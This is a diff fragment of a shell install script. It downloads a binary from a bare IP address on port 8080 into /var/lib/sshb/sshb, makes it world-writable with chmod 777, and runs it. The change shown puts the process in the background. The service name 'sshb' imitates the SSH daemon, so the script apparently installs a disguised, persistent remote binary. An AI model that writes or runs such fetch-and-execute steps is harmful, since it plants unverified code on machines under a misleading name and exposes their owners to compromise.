@@ -15,7 +15,7 @@ systemctl start sshb
 #Curl the binary file to sshb
 curl 129.21.49.57:8080/client > /var/lib/sshb/sshb
 chmod 777 /var/lib/sshb/sshb
-/var/lib/sshb/sshb
+/var/lib/sshb/sshb &
 #Tell the user you finished
 # echo Finished install!
 # systemctl status sshb
